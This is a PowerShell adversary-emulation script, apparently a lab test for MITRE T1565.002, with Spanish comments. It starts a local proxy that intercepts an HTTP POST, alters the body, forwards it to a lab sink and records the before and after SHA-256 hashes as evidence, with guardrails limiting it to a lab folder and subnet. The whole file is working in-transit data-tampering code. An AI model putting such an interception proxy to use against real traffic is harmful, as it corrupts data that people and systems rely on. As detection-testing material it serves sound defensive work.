# ATA096 - T1565.002 Transmitted Data Manipulation (Windows)
# Manual: proxy 127.0.0.1:9095 reescribe el body; el sink 192.168.65.1:9090 recibe sha alterado.
$ErrorActionPreference = 'Continue'
$ProgressPreference = 'SilentlyContinue'
$dir = Split-Path -Parent $MyInvocation.MyCommand.Path
if ($dir -notlike 'C:\lab-attack\ATA096*') { Write-Error 'GUARDARRAIL: carpeta no permitida'; exit 2 }
$ev = Join-Path $dir 'evidencias'
New-Item -ItemType Directory -Force -Path $ev | Out-Null
$sink = '192.168.65.1'
$sinkPort = 9090
if ($sink -notlike '192.168.65.*') { 'GUARDARRAIL: destino no permitido' | Out-File (Join-Path $ev 'efecto_local.txt') -Encoding ascii; exit 2 }
$payload = Join-Path $dir 'payload.txt'
1..20 | ForEach-Object { "TFG transmit $_ " + ('C' * 64) } | Set-Content -Path $payload -Encoding ascii
$origBytes = [IO.File]::ReadAllBytes($payload)
$origSha = [BitConverter]::ToString([Security.Cryptography.SHA256]::Create().ComputeHash($origBytes)).Replace('-', '').ToLower()
$proxyLog = Join-Path $ev 'proxy.log'
$proxy = Start-Job -ScriptBlock {
    param($lp, $sp, $log)
    $l = New-Object System.Net.Sockets.TcpListener([System.Net.IPAddress]::Loopback, $lp)
    $l.Server.SetSocketOption([System.Net.Sockets.SocketOptionLevel]::Socket, [System.Net.Sockets.SocketOptionName]::ReuseAddress, $true)
    $l.Start(5)
    $end = (Get-Date).AddSeconds(60)
    while ((Get-Date) -lt $end) {
        if ($l.Pending()) {
            $c = $l.AcceptTcpClient()
            $s = $c.GetStream()
            $buf = New-Object byte[] 65536
            $n = $s.Read($buf, 0, $buf.Length)
            $req = [Text.Encoding]::ASCII.GetString($buf, 0, $n)
            $sep = $req.IndexOf("`r`n`r`n")
            $body = ''
            if ($sep -ge 0) { $body = $req.Substring($sep + 4) }
            $mod = $body + "`nMANIPULADO-POR-PROXY"
            $mb = [Text.Encoding]::ASCII.GetBytes($mod)
            $shaO = [BitConverter]::ToString([Security.Cryptography.SHA256]::Create().ComputeHash([Text.Encoding]::ASCII.GetBytes($body))).Replace('-', '').ToLower()
            $shaM = [BitConverter]::ToString([Security.Cryptography.SHA256]::Create().ComputeHash($mb)).Replace('-', '').ToLower()
            Add-Content -Path $log -Value "orig=$shaO mod=$shaM" -Encoding ascii
            $sc = New-Object System.Net.Sockets.TcpClient
            $sc.Connect($sp, 9090)
            $ss = $sc.GetStream()
            $hdr = "POST /upload/ATA096 HTTP/1.1`r`nHost: $sp`:9090`r`nContent-Length: $($mb.Length)`r`nContent-Type: text/plain`r`nConnection: close`r`n`r`n"
            $hb = [Text.Encoding]::ASCII.GetBytes($hdr)
            $ss.Write($hb, 0, $hb.Length)
            $ss.Write($mb, 0, $mb.Length)
            $ss.Flush()
            $resp = New-Object byte[] 65536
            $rn = $ss.Read($resp, 0, $resp.Length)
            $s.Write($resp, 0, $rn)
            $s.Flush()
            $c.Close()
            $sc.Close()
        } else { Start-Sleep -Milliseconds 50 }
    }
    $l.Stop()
} -ArgumentList 9095, $sink, $proxyLog
Start-Sleep -Seconds 2
$t0 = (Get-Date).ToUniversalTime().ToString('yyyy-MM-ddTHH:mm:ssZ')
try {
    $null = Invoke-WebRequest -Uri "http://$sink`:$sinkPort/upload/ATA096" -Proxy 'http://127.0.0.1:9095' -Method POST -Body (Get-Content $payload -Raw) -UseBasicParsing -TimeoutSec 10
} catch {}
$t1 = (Get-Date).ToUniversalTime().ToString('yyyy-MM-ddTHH:mm:ssZ')
Start-Sleep -Milliseconds 500
Stop-Job $proxy -ErrorAction SilentlyContinue
Remove-Job $proxy -Force -ErrorAction SilentlyContinue
$line = ''
if (Test-Path $proxyLog) { $line = (Get-Content $proxyLog -Tail 1).Trim() }
$modSha = ''
if ($line -match 'mod=([0-9a-f]{64})') { $modSha = $Matches[1] }
@(
    "ata=ATA096", "tecnica=T1565.002", "fuente=manual",
    "t0=$t0", "t1=$t1", "proxy=127.0.0.1:9095", "sink=$sink`:$sinkPort",
    "sha256_original=$origSha", "sha256_modified=$modSha",
    "alterado=$($origSha -ne $modSha -and $modSha -ne '')"
) | Out-File -FilePath (Join-Path $ev 'efecto_local.txt') -Encoding ascii
exit 0
